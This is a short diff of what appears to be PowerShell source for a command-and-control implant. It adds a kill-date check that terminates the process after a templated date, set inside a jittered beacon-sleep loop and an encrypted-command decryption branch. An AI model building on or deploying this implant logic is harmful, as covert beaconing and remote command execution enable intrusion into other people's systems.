@@ -107,6 +107,10 @@ $min=[int]$beacon/2+1
 $max=[int]$beacon+1
 $beacon=Get-Random -Minimum $min -Maximum $max -SetSeed $seed
 sleep $beacon
+$date = (Get-Date -Format "dd/MM/yyyy")
+$date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
+$kdate = [datetime]::ParseExact("{DATE}","dd/MM/yyyy",$null)
+if ($kdate -lt $date) {kill $pid}
 }
 else{
 $cm=dec -key $key -enc $enc
